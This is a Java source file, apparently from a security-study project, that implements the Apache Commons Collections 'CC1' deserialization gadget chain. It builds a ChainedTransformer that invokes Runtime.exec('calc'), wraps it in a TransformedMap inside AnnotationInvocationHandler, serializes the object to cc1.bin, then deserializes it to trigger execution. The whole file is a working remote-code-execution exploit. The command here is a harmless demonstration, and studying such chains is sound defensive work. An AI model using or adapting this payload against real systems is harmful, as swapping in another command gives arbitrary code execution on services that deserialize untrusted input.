package cn.hungslabsec.playloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        ConstantTransformer ct = new ConstantTransformer(Runtime.class);

        String methodName1 = "getMethod";
        Class[] paramTypes1 = {String.class, Class[].class};
        Object[] args1 = {"getRuntime", null};
        InvokerTransformer it1 = new InvokerTransformer(methodName1, paramTypes1, args1);

        String methodName2 = "invoke";
        Class[] paramTypes2 = {Object.class, Object[].class};
        Object[] args2 = {null, null};
        InvokerTransformer it2 = new InvokerTransformer(methodName2, paramTypes2, args2);

        String methodName3 = "exec";
        Class[] paramTypes3 = {String.class};
        Object[] args3 = {"calc"};
        InvokerTransformer it3 = new InvokerTransformer(methodName3, paramTypes3, args3);

        Transformer[] transformers = {ct, it1, it2, it3};
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        /*
        ChainedTransformer
        */

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", ""); //解释二
        Map decorated = TransformedMap.decorate(map, null, chainedTransformer);
        /*
        TransformedMap.decorate
        */

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annoConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        annoConstructor.setAccessible(true);
        Object poc = annoConstructor.newInstance(Target.class, decorated); //解释一
		/*
		AnnotationInvocationHandler
		*/

        serial(poc);
        unserial();
    }

    public static void serial(Object obj) throws IOException {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("./cc1.bin"));
        out.writeObject(obj);
    }

    public static void unserial() throws IOException, ClassNotFoundException {
        ObjectInputStream in = new ObjectInputStream(new FileInputStream("./cc1.bin"));
        in.readObject();
    }
}